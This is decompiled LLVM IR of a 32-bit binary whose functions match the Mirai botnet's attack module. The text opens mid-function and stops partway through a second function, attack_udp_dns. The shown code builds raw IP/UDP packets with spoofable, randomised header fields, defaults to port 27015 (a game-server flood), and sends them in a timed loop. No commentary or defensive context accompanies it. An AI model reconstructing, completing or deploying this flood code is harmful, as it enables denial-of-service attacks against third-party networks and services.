  %v0_804cbe7 = load i32, i32* @ebx, align 4
  %v4_804cbe8 = trunc i32 %v0_804cbe7 to i8
  %v5_804cbe8 = call i32 @attack_get_opt_int(i8 %v4_804cbe8, i32 %v0_804cbe6, i32 7, i32 27015)
  store i32 %v5_804cbe8, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %sext1 = mul i32 %v5_804cbe8, 65536
  %v1_804cbfc = sdiv i32 %sext1, 65536
  store i32 %v1_804cbfc, i32* @ebx, align 4
  %v2_804cbfe = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v2_804cc07 = add i32 %v2_804cbfe, %arg1
  store i32 %v2_804cc07, i32* %eax.global-to-local, align 4
  %v2_804cc14 = call i32 @table_unlock_val(i8 36)
  store i32 36, i32* %ecx.global-to-local, align 4
  store i32 %v0_804cbe6, i32* @esi, align 4
  %v2_804cc1b = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804cc1b, i32* %eax.global-to-local, align 4
  %v3_804cc22 = call i32 @table_retrieve_val(i32 36, i32* nonnull %stack_var_-24)
  store i32 %v3_804cc22, i32* %eax.global-to-local, align 4
  %v3_804cc34 = call i32 @socket(i32 2, i32 3, i32 17)
  %v1_804cc40 = add i32 %v3_804cc34, 1
  %v8_804cc40 = icmp eq i32 %v1_804cc40, 0
  store i32 %v1_804cc40, i32* %eax.global-to-local, align 4
  br i1 %v8_804cc40, label %dec_label_pc_804ced8, label %dec_label_pc_804cc47

dec_label_pc_804cc47:                             ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v2_804cc54 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804cc54, i32* %eax.global-to-local, align 4
  store i32 %v3_804cc34, i32* %edx.global-to-local, align 4
  %v5_804cc62 = call i32 @__GI_setsockopt(i32 %v3_804cc34, i32 0, i32 3, i32 %v2_804cc54, i32 4)
  %v1_804cc6a = add i32 %v5_804cc62, 1
  %v8_804cc6a = icmp eq i32 %v1_804cc6a, 0
  store i32 %v1_804cc6a, i32* %eax.global-to-local, align 4
  br i1 %v8_804cc6a, label %dec_label_pc_804cee0, label %dec_label_pc_804cc71

dec_label_pc_804cc71:                             ; preds = %dec_label_pc_804cc47
  %v0_804cc71 = load i32, i32* @ebp, align 4
  %v1_804cc71 = trunc i32 %v0_804cc71 to i16
  %v0_804cc7b = load i32, i32* @ebx, align 4
  store i32 %v0_804cc7b, i32* @ebp, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v4_804cc85 = icmp eq i8 %arg2, 0
  br i1 %v4_804cc85, label %dec_label_pc_804cec1.critedge, label %dec_label_pc_804cc90

dec_label_pc_804cc90:                             ; preds = %dec_label_pc_804cc71
  %v5_804cc90 = load i32, i32* @ecx, align 4
  %v6_804cc90 = and i32 %v5_804cc90, -65536
  store i32 0, i32* @ebx, align 4
  %v2_804cc97 = call i16 @llvm.bswap.i16(i16 %v1_804cc71)
  %v3_804cc97 = zext i16 %v2_804cc97 to i32
  %v6_804cc97 = or i32 %v6_804cc90, %v3_804cc97
  store i32 %v6_804cc97, i32* %ecx.global-to-local, align 4
  %v3_804cca0 = call i16 @llvm.bswap.i16(i16 %v1_804cbdd)
  %v4_804cca0 = zext i16 %v3_804cca0 to i32
  %sext2 = mul i32 %v5_804cbd5, 65536
  %v6_804cca0 = sdiv i32 %sext2, 65536
  %v7_804cca0 = and i32 %v6_804cca0, -65536
  %v8_804cca0 = or i32 %v4_804cca0, %v7_804cca0
  store i32 %v8_804cca0, i32* @edi, align 4
  %v4_804cce5 = urem i32 %v5_804cbb1, 256
  %v4_804ccef = icmp eq i8 %v6_804cbc3, 0
  %v3_804cd13 = add i32 %arg3, 16
  %v1_804ccec = trunc i32 %v5_804cbb1 to i8
  br label %dec_label_pc_804cca4

dec_label_pc_804cca4:                             ; preds = %dec_label_pc_804ccfc, %dec_label_pc_804cc90
  %v3_804ccad = call i32 @calloc(i64 128, i32 1)
  store i32 %v3_804ccad, i32* %eax.global-to-local, align 4
  store i32 %v3_804cb80, i32* %edx.global-to-local, align 4
  %v3_804ccb6 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804ccb6, i32* %ecx.global-to-local, align 4
  %v2_804ccba = load i32, i32* @ebx, align 4
  %v3_804ccba = mul i32 %v2_804ccba, 4
  %v4_804ccba = add i32 %v3_804ccba, %v3_804cb80
  %v5_804ccba = inttoptr i32 %v4_804ccba to i32*
  store i32 %v3_804ccad, i32* %v5_804ccba, align 4
  %v0_804ccbd = load i32, i32* %edx.global-to-local, align 4
  %v1_804ccbd = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ccbd = mul i32 %v1_804ccbd, 4
  %v3_804ccbd = add i32 %v2_804ccbd, %v0_804ccbd
  %v4_804ccbd = inttoptr i32 %v3_804ccbd to i32*
  %v5_804ccbd = load i32, i32* %v4_804ccbd, align 4
  store i32 %v5_804ccbd, i32* %edx.global-to-local, align 4
  %v1_804ccc0 = inttoptr i32 %v5_804ccbd to i8*
  store i8 69, i8* %v1_804ccc0, align 1
  %v0_804ccc3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ccc3 = add i32 %v0_804ccc3, 20
  store i32 %v1_804ccc3, i32* @esi, align 4
  %v3_804ccca = add i32 %v0_804ccc3, 1
  %v4_804ccca = inttoptr i32 %v3_804ccca to i8*
  store i8 %v6_804cb8f, i8* %v4_804ccca, align 1
  %v3_804cccd = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_804cccd, i32* @ebx, align 4
  %v1_804ccd1 = add i32 %v3_804cccd, 32
  %v1_804ccd4 = trunc i32 %v1_804ccd1 to i16
  %v2_804ccd4 = call i16 @llvm.bswap.i16(i16 %v1_804ccd4)
  %v3_804ccd4 = zext i16 %v2_804ccd4 to i32
  %v5_804ccd4 = and i32 %v1_804ccd1, -65536
  %v6_804ccd4 = or i32 %v3_804ccd4, %v5_804ccd4
  store i32 %v6_804ccd4, i32* %eax.global-to-local, align 4
  %v2_804ccd8 = load i32, i32* %edx.global-to-local, align 4
  %v3_804ccd8 = add i32 %v2_804ccd8, 2
  %v4_804ccd8 = inttoptr i32 %v3_804ccd8 to i16*
  store i16 %v2_804ccd4, i16* %v4_804ccd8, align 2
  %v5_804ccdc = load i32, i32* %eax.global-to-local, align 4
  %v6_804ccdc = and i32 %v5_804ccdc, -65536
  %v7_804ccdc = or i32 %v6_804ccdc, %v3_804cc97
  store i32 %v7_804ccdc, i32* %eax.global-to-local, align 4
  %v2_804cce1 = load i32, i32* %edx.global-to-local, align 4
  %v3_804cce1 = add i32 %v2_804cce1, 4
  %v4_804cce1 = inttoptr i32 %v3_804cce1 to i16*
  store i16 %v2_804cc97, i16* %v4_804cce1, align 2
  %v5_804cce5 = load i32, i32* %eax.global-to-local, align 4
  %v6_804cce5 = and i32 %v5_804cce5, -256
  %v7_804cce5 = or i32 %v6_804cce5, %v4_804cce5
  store i32 %v7_804cce5, i32* %eax.global-to-local, align 4
  %v2_804ccec = load i32, i32* %edx.global-to-local, align 4
  %v3_804ccec = add i32 %v2_804ccec, 8
  %v4_804ccec = inttoptr i32 %v3_804ccec to i8*
  store i8 %v1_804ccec, i8* %v4_804ccec, align 1
  br i1 %v4_804ccef, label %dec_label_pc_804ccfc, label %dec_label_pc_804ccf6

dec_label_pc_804ccf6:                             ; preds = %dec_label_pc_804cca4
  %v0_804ccf6 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ccf6 = add i32 %v0_804ccf6, 6
  %v2_804ccf6 = inttoptr i32 %v1_804ccf6 to i16*
  store i16 64, i16* %v2_804ccf6, align 2
  br label %dec_label_pc_804ccfc

dec_label_pc_804ccfc:                             ; preds = %dec_label_pc_804cca4, %dec_label_pc_804ccf6
  %v0_804ccfc = load i32, i32* %edx.global-to-local, align 4
  %v1_804ccfc = add i32 %v0_804ccfc, 9
  %v2_804ccfc = inttoptr i32 %v1_804ccfc to i8*
  store i8 17, i8* %v2_804ccfc, align 1
  %v0_804cd00 = load i32, i32* @edi, align 4
  %v1_804cd00 = trunc i32 %v0_804cd00 to i16
  %v2_804cd00 = load i32, i32* %edx.global-to-local, align 4
  %v3_804cd00 = add i32 %v2_804cd00, 20
  %v4_804cd00 = inttoptr i32 %v3_804cd00 to i16*
  store i16 %v1_804cd00, i16* %v4_804cd00, align 2
  %v0_804cd04 = load i32, i32* @global_var_805a858.27, align 8
  %v1_804cd09 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cd09 = add i32 %v1_804cd09, 12
  %v3_804cd09 = inttoptr i32 %v2_804cd09 to i32*
  store i32 %v0_804cd04, i32* %v3_804cd09, align 4
  %v0_804cd0c = load i32, i32* %ecx.global-to-local, align 4
  %v3_804cd0c = mul i32 %v0_804cd0c, 3
  store i32 %v3_804cd0c, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v2_804cd13 = mul i32 %v0_804cd0c, 24
  %v4_804cd13 = add i32 %v3_804cd13, %v2_804cd13
  %v5_804cd13 = inttoptr i32 %v4_804cd13 to i32*
  %v6_804cd13 = load i32, i32* %v5_804cd13, align 4
  store i32 %v6_804cd13, i32* %eax.global-to-local, align 4
  %v0_804cd17 = load i32, i32* %edx.global-to-local, align 4
  %v1_804cd17 = add i32 %v0_804cd17, 28
  %v2_804cd17 = inttoptr i32 %v1_804cd17 to i32*
  store i32 -1, i32* %v2_804cd17, align 4
  %v0_804cd1e = load i32, i32* %eax.global-to-local, align 4
  %v1_804cd1e = load i32, i32* %edx.global-to-local, align 4
  %v2_804cd1e = add i32 %v1_804cd1e, 16
  %v3_804cd1e = inttoptr i32 %v2_804cd1e to i32*
  store i32 %v0_804cd1e, i32* %v3_804cd1e, align 4
  %v0_804cd21 = load i32, i32* @ebp, align 4
  %v1_804cd23 = trunc i32 %v0_804cd21 to i16
  %v2_804cd23 = call i16 @llvm.bswap.i16(i16 %v1_804cd23)
  %v2_804cd27 = load i32, i32* @esi, align 4
  %v3_804cd27 = add i32 %v2_804cd27, 2
  %v4_804cd27 = inttoptr i32 %v3_804cd27 to i16*
  store i16 %v2_804cd23, i16* %v4_804cd27, align 2
  %v0_804cd2b = load i32, i32* @ebx, align 4
  %v1_804cd2b = add i32 %v0_804cd2b, 12
  %v1_804cd2e = trunc i32 %v1_804cd2b to i16
  %v2_804cd2e = call i16 @llvm.bswap.i16(i16 %v1_804cd2e)
  %v2_804cd32 = load i32, i32* @esi, align 4
  %v3_804cd32 = add i32 %v2_804cd32, 4
  %v4_804cd32 = inttoptr i32 %v3_804cd32 to i16*
  store i16 %v2_804cd2e, i16* %v4_804cd32, align 2
  %v3_804cd37 = load i32, i32* %stack_var_-24, align 4
  %v0_804cd41 = load i32, i32* %edx.global-to-local, align 4
  %v1_804cd41 = add i32 %v0_804cd41, 32
  store i32 %v1_804cd41, i32* %eax.global-to-local, align 4
  %v3_804cd45 = call i32 @util_memcpy(i32 %v1_804cd41, i32 %v3_804cc22, i32 %v3_804cd37)
  store i32 %v3_804cd45, i32* %eax.global-to-local, align 4
  %v3_804cd4a = load i32, i32* %stack_var_-20, align 4
  %v1_804cd4e = add i32 %v3_804cd4a, 1
  store i32 %v1_804cd4e, i32* @ebx, align 4
  store i32 %v1_804cd4e, i32* %stack_var_-20, align 4
  %v5_804cd5a = icmp slt i32 %v1_804cd4e, %v4_804cb59
  br i1 %v5_804cd5a, label %dec_label_pc_804cca4, label %dec_label_pc_804cd60

dec_label_pc_804cd60:                             ; preds = %dec_label_pc_804ccfc, %dec_label_pc_804cec1
  store i32 0, i32* %stack_var_-20, align 4
  br i1 %v4_804cc85, label %dec_label_pc_804cec1, label %dec_label_pc_804cd73

dec_label_pc_804cd73:                             ; preds = %dec_label_pc_804cd60
  store i32 0, i32* %eax.global-to-local, align 4
  %v13_804cd80 = icmp eq i16 %v1_804cc71, -1
  %v13_804ce8c = icmp eq i16 %v1_804cbdd, -1
  %v3_804ce5f = add i32 %arg3, 20
  %v1_804ce96 = icmp eq i1 %v13_804ce8c, false
  %v1_804ce81 = icmp eq i1 %v13_804cd80, false
  br label %dec_label_pc_804ce23

dec_label_pc_804cd80:                             ; preds = %dec_label_pc_804ce23
  br i1 %v13_804cd80, label %dec_label_pc_804ce87, label %dec_label_pc_804cd8c

dec_label_pc_804cd8c:                             ; preds = %bb46, %dec_label_pc_804cd80
  br i1 %v13_804ce8c, label %dec_label_pc_804cea0, label %dec_label_pc_804cd98

dec_label_pc_804cd98:                             ; preds = %dec_label_pc_804ce87, %dec_label_pc_804cd8c
  %v0_804cd98 = load i32, i32* @ebp, align 4
  %v1_804cd98 = trunc i32 %v0_804cd98 to i16
  %v11_804cd98 = icmp eq i16 %v1_804cd98, -1
  br i1 %v11_804cd98, label %dec_label_pc_804ceb3, label %dec_label_pc_804cda2

dec_label_pc_804cda2:                             ; preds = %dec_label_pc_804cea0, %dec_label_pc_804cd98, %dec_label_pc_804ceb3
  %v0_804cda2 = load i32, i32* @esi, align 4
  %v1_804cda2 = add i32 %v0_804cda2, 10
  %v2_804cda2 = inttoptr i32 %v1_804cda2 to i16*
  store i16 0, i16* %v2_804cda2, align 2
  %v0_804cdac = load i32, i32* @esi, align 4
  %v2_804cdad = inttoptr i32 %v0_804cdac to i16*
  %v3_804cdad = call i32 @checksum_generic(i16* %v2_804cdad, i32 20)
  %v4_804cdad = trunc i32 %v3_804cdad to i16
  %v3_804cdb2 = load i32, i32* @esi, align 4
  %v4_804cdb2 = add i32 %v3_804cdb2, 10
  %v5_804cdb2 = inttoptr i32 %v4_804cdb2 to i16*
  store i16 %v4_804cdad, i16* %v5_804cdb2, align 2
  %v3_804cdb6 = load i32, i32* %stack_var_-24, align 4
  %v1_804cdba = add i32 %v3_804cdb6, 12
  store i32 %v1_804cdba, i32* %eax.global-to-local, align 4
  %v0_804cdbd = load i32, i32* @edi, align 4
  %v1_804cdbd = add i32 %v0_804cdbd, 6
  %v2_804cdbd = inttoptr i32 %v1_804cdbd to i16*
  store i16 0, i16* %v2_804cdbd, align 2
  %v0_804cdc4 = load i32, i32* @edi, align 4
  %v1_804cdc4 = add i32 %v0_804cdc4, 4
  %v2_804cdc4 = inttoptr i32 %v1_804cdc4 to i16*
  %v3_804cdc4 = load i16, i16* %v2_804cdc4, align 2
  %v4_804cdc4 = zext i16 %v3_804cdc4 to i32
  store i32 %v4_804cdc4, i32* %eax.global-to-local, align 4
  %v0_804cdcf = load i32, i32* @esi, align 4
  %v4_804cdd0 = inttoptr i32 %v0_804cdc4 to i16*
  %v5_804cdd0 = call i32 @checksum_tcpudp(i32 %v0_804cdcf, i16* %v4_804cdd0, i32 %v4_804cdc4)
  %v6_804cdd0 = trunc i32 %v5_804cdd0 to i16
  %v3_804cdd5 = load i32, i32* @edi, align 4
  %v4_804cdd5 = add i32 %v3_804cdd5, 6
  %v5_804cdd5 = inttoptr i32 %v4_804cdd5 to i16*
  store i16 %v6_804cdd0, i16* %v5_804cdd5, align 2
  %v3_804cdd9 = load i32, i32* %stack_var_-20, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v3_804cde4 = mul i32 %v3_804cdd9, 3
  store i32 %v3_804cde4, i32* %eax.global-to-local, align 4
  %v0_804cde7 = load i32, i32* @edi, align 4
  %v1_804cde7 = add i32 %v0_804cde7, 2
  %v2_804cde7 = inttoptr i32 %v1_804cde7 to i16*
  %v3_804cde7 = load i16, i16* %v2_804cde7, align 2
  %v4_804cde7 = zext i16 %v3_804cde7 to i32
  %v5_804cde7 = load i32, i32* @edx, align 4
  %v6_804cde7 = and i32 %v5_804cde7, -65536
  %v7_804cde7 = or i32 %v6_804cde7, %v4_804cde7
  store i32 %v7_804cde7, i32* %edx.global-to-local, align 4
  %v2_804cdeb = mul i32 %v3_804cdd9, 24
  %v3_804cdeb = add i32 %v2_804cdeb, %arg3
  store i32 %v3_804cdeb, i32* %eax.global-to-local, align 4
  %v3_804cdee = add i32 %v3_804cdeb, 2
  %v4_804cdee = inttoptr i32 %v3_804cdee to i16*
  store i16 %v3_804cde7, i16* %v4_804cdee, align 2
  %v0_804cdf4 = load i32, i32* %eax.global-to-local, align 4
  %v3_804cdfa = load i32, i32* %stack_var_-24, align 4
  %v1_804cdfe = add i32 %v3_804cdfa, 32
  store i32 %v1_804cdfe, i32* %eax.global-to-local, align 4
  %v0_804ce02 = load i32, i32* @esi, align 4
  store i32 %v3_804cc34, i32* @ebx, align 4
  %v6_804ce08 = call i32 @__libc_sendto(i32 %v3_804cc34, i32 %v0_804ce02, i32 %v1_804cdfe, i32 16384, i32 %v0_804cdf4, i32 16)
  %v3_804ce0d = load i32, i32* %stack_var_-20, align 4
  %v1_804ce11 = add i32 %v3_804ce0d, 1
  store i32 %v1_804ce11, i32* %eax.global-to-local, align 4
  store i32 %v1_804ce11, i32* %stack_var_-20, align 4
  %v5_804ce1d = icmp slt i32 %v1_804ce11, %v4_804cb59
  br i1 %v5_804ce1d, label %dec_label_pc_804ce23, label %dec_label_pc_804cec1

dec_label_pc_804ce23:                             ; preds = %dec_label_pc_804cda2, %dec_label_pc_804cd73
  %v0_804ce44 = phi i32 [ %v1_804ce11, %dec_label_pc_804cda2 ], [ 0, %dec_label_pc_804cd73 ]
  store i32 %v3_804cb80, i32* %edx.global-to-local, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v2_804ce2b = mul i32 %v0_804ce44, 4
  %v3_804ce2b = add i32 %v2_804ce2b, %v3_804cb80
  %v4_804ce2b = inttoptr i32 %v3_804ce2b to i32*
  %v5_804ce2b = load i32, i32* %v4_804ce2b, align 4
  store i32 %v5_804ce2b, i32* @esi, align 4
  %v2_804ce31 = mul i32 %v0_804ce44, 24
  %v3_804ce31 = add i32 %v2_804ce31, %arg3
  store i32 %v3_804ce31, i32* %eax.global-to-local, align 4
  %v1_804ce34 = add i32 %v5_804ce2b, 20
  store i32 %v1_804ce34, i32* @edi, align 4
  %v1_804ce37 = add i32 %v3_804ce31, 20
  %v2_804ce37 = inttoptr i32 %v1_804ce37 to i8*
  %v3_804ce37 = load i8, i8* %v2_804ce37, align 1
  %v6_804ce3b = icmp ugt i8 %v3_804ce37, 31
  br i1 %v6_804ce3b, label %dec_label_pc_804cd80, label %dec_label_pc_804ce41

dec_label_pc_804ce41:                             ; preds = %dec_label_pc_804ce23
  %v1_804ce41 = add i32 %v3_804ce31, 16
  %v2_804ce41 = inttoptr i32 %v1_804ce41 to i32*
  %v3_804ce41 = load i32, i32* %v2_804ce41, align 4
  %v1_804ce44 = call i32 @rand_next(i32 %v0_804ce44)
  store i32 %v1_804ce44, i32* %eax.global-to-local, align 4
  %v1_804ce49 = trunc i32 %v3_804ce41 to i16
  %v2_804ce49 = call i16 @llvm.bswap.i16(i16 %v1_804ce49)
  %v3_804ce49 = zext i16 %v2_804ce49 to i32
  %v1_804ce4d = udiv i32 %v3_804ce41, 65536
  %v2_804ce4d = mul nuw i32 %v3_804ce49, 65536
  %v1_804ce50 = trunc i32 %v1_804ce4d to i16
  %v2_804ce50 = call i16 @llvm.bswap.i16(i16 %v1_804ce50)
  %v3_804ce50 = zext i16 %v2_804ce50 to i32
  %v6_804ce50 = or i32 %v3_804ce50, %v2_804ce4d
  %v3_804ce54 = load i32, i32* %stack_var_-20, align 4
  %v3_804ce58 = mul i32 %v3_804ce54, 3
  store i32 %v3_804ce58, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v2_804ce5f = mul i32 %v3_804ce54, 24
  %v4_804ce5f = add i32 %v3_804ce5f, %v2_804ce5f
  %v5_804ce5f = inttoptr i32 %v4_804ce5f to i8*
  %v6_804ce5f = load i8, i8* %v5_804ce5f, align 1
  %v7_804ce5f = zext i8 %v6_804ce5f to i32
  store i32 %v7_804ce5f, i32* %ecx.global-to-local, align 4
  %tmp = urem i8 %v6_804ce5f, 32
  %v4_804ce69 = icmp eq i8 %tmp, 0
  br i1 %v4_804ce69, label %bb46, label %bb

bb:                                               ; preds = %dec_label_pc_804ce41
  %v2_804ce69 = zext i8 %tmp to i32
  %v5_804ce69 = lshr i32 %v1_804ce44, %v2_804ce69
  store i32 %v5_804ce69, i32* %eax.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_804ce41, %bb
  %v1_804ce6b = phi i32 [ %v1_804ce44, %dec_label_pc_804ce41 ], [ %v5_804ce69, %bb ]
  %v2_804ce6b = add i32 %v1_804ce6b, %v6_804ce50
  %v1_804ce6d = trunc i32 %v2_804ce6b to i16
  %v2_804ce6d = call i16 @llvm.bswap.i16(i16 %v1_804ce6d)
  %v3_804ce6d = zext i16 %v2_804ce6d to i32
  %v1_804ce71 = udiv i32 %v2_804ce6b, 65536
  %v2_804ce71 = mul nuw i32 %v3_804ce6d, 65536
  %v1_804ce74 = trunc i32 %v1_804ce71 to i16
  %v2_804ce74 = call i16 @llvm.bswap.i16(i16 %v1_804ce74)
  %v3_804ce74 = zext i16 %v2_804ce74 to i32
  %v6_804ce74 = or i32 %v3_804ce74, %v2_804ce71
  %v1_804ce7e = load i32, i32* @esi, align 4
  %v2_804ce7e = add i32 %v1_804ce7e, 16
  %v3_804ce7e = inttoptr i32 %v2_804ce7e to i32*
  store i32 %v6_804ce74, i32* %v3_804ce7e, align 4
  br i1 %v1_804ce81, label %dec_label_pc_804cd8c, label %.dec_label_pc_804ce87_crit_edge

.dec_label_pc_804ce87_crit_edge:                  ; preds = %bb46
  %v0_804ce87.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_804ce87

dec_label_pc_804ce87:                             ; preds = %.dec_label_pc_804ce87_crit_edge, %dec_label_pc_804cd80
  %v0_804ce87 = phi i32 [ %v0_804ce87.pre, %.dec_label_pc_804ce87_crit_edge ], [ %v0_804ce44, %dec_label_pc_804cd80 ]
  %v1_804ce87 = call i32 @rand_next(i32 %v0_804ce87)
  store i32 %v1_804ce87, i32* %eax.global-to-local, align 4
  %v1_804ce92 = trunc i32 %v1_804ce87 to i16
  %v2_804ce92 = load i32, i32* @esi, align 4
  %v3_804ce92 = add i32 %v2_804ce92, 4
  %v4_804ce92 = inttoptr i32 %v3_804ce92 to i16*
  store i16 %v1_804ce92, i16* %v4_804ce92, align 2
  br i1 %v1_804ce96, label %dec_label_pc_804cd98, label %dec_label_pc_804cea0

dec_label_pc_804cea0:                             ; preds = %dec_label_pc_804ce87, %dec_label_pc_804cd8c
  %v0_804cea0 = load i32, i32* %stack_var_-20, align 4
  %v1_804cea0 = call i32 @rand_next(i32 %v0_804cea0)
  store i32 %v1_804cea0, i32* %eax.global-to-local, align 4
  %v0_804cea5 = load i32, i32* @ebp, align 4
  %v1_804cea5 = trunc i32 %v0_804cea5 to i16
  %v11_804cea5 = icmp eq i16 %v1_804cea5, -1
  %v1_804cea9 = trunc i32 %v1_804cea0 to i16
  %v2_804cea9 = load i32, i32* @esi, align 4
  %v3_804cea9 = add i32 %v2_804cea9, 20
  %v4_804cea9 = inttoptr i32 %v3_804cea9 to i16*
  store i16 %v1_804cea9, i16* %v4_804cea9, align 2
  %v1_804cead = icmp eq i1 %v11_804cea5, false
  br i1 %v1_804cead, label %dec_label_pc_804cda2, label %dec_label_pc_804ceb3

dec_label_pc_804ceb3:                             ; preds = %dec_label_pc_804cea0, %dec_label_pc_804cd98
  %v0_804ceb3 = load i32, i32* %stack_var_-20, align 4
  %v1_804ceb3 = call i32 @rand_next(i32 %v0_804ceb3)
  store i32 %v1_804ceb3, i32* %eax.global-to-local, align 4
  %v1_804ceb8 = trunc i32 %v1_804ceb3 to i16
  %v2_804ceb8 = load i32, i32* @edi, align 4
  %v3_804ceb8 = add i32 %v2_804ceb8, 2
  %v4_804ceb8 = inttoptr i32 %v3_804ceb8 to i16*
  store i16 %v1_804ceb8, i16* %v4_804ceb8, align 2
  br label %dec_label_pc_804cda2

dec_label_pc_804cec1.critedge:                    ; preds = %dec_label_pc_804cc71
  store i32 0, i32* %stack_var_-20, align 4
  br label %dec_label_pc_804cec1

dec_label_pc_804cec1:                             ; preds = %dec_label_pc_804cda2, %dec_label_pc_804cec1.critedge, %dec_label_pc_804cd60
  %v2_804cec6 = call i32 @__GI_time(i32* null)
  store i32 %v2_804cec6, i32* %eax.global-to-local, align 4
  %v5_804ced2 = icmp slt i32 %v2_804cc07, %v2_804cec6
  br i1 %v5_804ced2, label %dec_label_pc_804ced8, label %dec_label_pc_804cd60

dec_label_pc_804ced8:                             ; preds = %dec_label_pc_804cec1, %entry
  %v0_804cedf = phi i32 [ %v2_804cec6, %dec_label_pc_804cec1 ], [ 0, %entry ]
  ret i32 %v0_804cedf

dec_label_pc_804cee0:                             ; preds = %dec_label_pc_804cc47
  store i32 %v3_804cc34, i32* @eax, align 4
  %v1_804cee8 = call i32 @__GI___libc_close(i32 %v3_804cc34)
  store i32 %v1_804cee8, i32* %eax.global-to-local, align 4
  ret i32 %v1_804cee8

; uselistorder directives
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 %v0_804ce44, { 2, 3, 0, 1 }
  uselistorder i32 %v1_804ce11, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804cc34, { 3, 2, 1, 0, 5, 4, 6 }
  uselistorder i32 %v5_804cbc3, { 1, 0 }
  uselistorder i32 %v5_804cbb1, { 1, 0, 2 }
  uselistorder i32 %v5_804cb8f, { 1, 0 }
  uselistorder i32 %v3_804cb80, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v4_804cb59, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-24, { 1, 2, 3, 4, 0, 6, 5 }
  uselistorder i32* %stack_var_-20, { 1, 3, 2, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 13, 14 }
  uselistorder i32* %edx.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 13, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 13, 14, 6, 7, 8, 9, 10, 11, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 %arg3, { 6, 0, 5, 1, 4, 7, 2, 3 }
  uselistorder i8 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cec1, { 1, 0, 2 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_804cda2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cd60, { 1, 0 }
  uselistorder label %dec_label_pc_804ccfc, { 1, 0 }
}

define i32 @attack_udp_dns(i32 %arg1, i8 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp69 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-2100 = alloca i32, align 4
  %stack_var_-2220 = alloca i32, align 4
  %v0_804cf03 = load i32, i32* @ebx, align 4
  %v4_804cf0a = zext i8 %arg2 to i32
  store i32 %arg5, i32* @esi, align 4
  %v4_804cf1c = urem i32 %arg4, 256
  store i32 0, i32* %stack_var_-20, align 4
  store i32 %v4_804cf1c, i32* @ebx, align 4
  store i32 %v4_804cf0a, i32* %eax.global-to-local, align 4
  store i32 %v4_804cf0a, i32* %stack_var_-2220, align 4
  %v2_804cf3d = zext i8 %arg2 to i64
  %v3_804cf3d = call i32 @calloc(i64 %v2_804cf3d, i32 4)
  store i32 %v3_804cf3d, i32* @eax, align 4
  %v0_804cf4a = load i32, i32* @esi, align 4
  %v0_804cf4b = load i32, i32* @ebx, align 4
  %v4_804cf4c = trunc i32 %v0_804cf4b to i8
  %v5_804cf4c = call i32 @attack_get_opt_int(i8 %v4_804cf4c, i32 %v0_804cf4a, i32 2, i32 0)
  %v6_804cf4c = trunc i32 %v5_804cf4c to i8
  store i32 %v5_804cf4c, i32* @eax, align 4
  %v0_804cf5f = load i32, i32* @esi, align 4
  %v0_804cf60 = load i32, i32* @ebx, align 4
  store i32 %v0_804cf60, i32* %stack_var_-2220, align 4
  %v4_804cf61 = trunc i32 %v0_804cf60 to i8
  %v5_804cf61 = call i32 @attack_get_opt_int(i8 %v4_804cf61, i32 %v0_804cf5f, i32 3, i32 65535)
  store i32 %v5_804cf61, i32* @eax, align 4
  %v0_804cf6e = load i32, i32* @esi, align 4
  %v0_804cf6f = load i32, i32* @ebx, align 4
  %v4_804cf70 = trunc i32 %v0_804cf6f to i8
  %v5_804cf70 = call i32 @attack_get_opt_int(i8 %v4_804cf70, i32 %v0_804cf6e, i32 4, i32 64)
  store i32 %v5_804cf70, i32* @eax, align 4
  %v0_804cf80 = load i32, i32* @esi, align 4
  %v0_804cf81 = load i32, i32* @ebx, align 4
  store i32 %v0_804cf81, i32* %stack_var_-2220, align 4
  %v4_804cf82 = trunc i32 %v0_804cf81 to i8
  %v5_804cf82 = call i32 @attack_get_opt_int(i8 %v4_804cf82, i32 %v0_804cf80, i32 5, i32 0)
  %v6_804cf82 = trunc i32 %v5_804cf82 to i8
  store i32 %v5_804cf82, i32* @eax, align 4
  %v0_804cf92 = load i32, i32* @esi, align 4
  %v0_804cf93 = load i32, i32* @ebx, align 4
  %v4_804cf94 = trunc i32 %v0_804cf93 to i8
  %v5_804cf94 = call i32 @attack_get_opt_int(i8 %v4_804cf94, i32 %v0_804cf92, i32 6, i32 65535)
